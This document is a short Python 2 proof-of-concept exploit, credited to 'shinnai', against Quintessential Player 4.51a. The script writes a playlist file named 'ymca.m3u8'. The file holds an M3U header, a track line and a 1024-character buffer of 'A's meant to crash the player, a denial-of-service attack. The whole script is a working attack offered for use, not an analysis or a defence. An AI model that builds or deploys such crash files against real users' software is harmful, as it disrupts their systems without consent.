#/usr/bin/python

print "-------------------------------------------------------------"
print " Quintessential Player 4.51a playlist file Denial of Service"
print " url: http://quinnware.com/"
print " author: shinnai"
print " mail: shinnai[at]autistici[dot]org"
print " site: http://shinnai.altervista.org"
print "-------------------------------------------------------------"

try:
   buff = "A" * 1024
   EXTM = "#EXTM3U\n"
   EXTI = "#EXTINF:280,The Village People / Y.M.C.A.\n"

   ccc= EXTM + EXTI + buff

   out_file = open('ymca.m3u8','a')
   out_file.write(ccc)
   out_file.close()

   print "\n File 'ymca.m3u8' created in python's dir. \n"

except:
   print "\n Unable to create the file! \n"
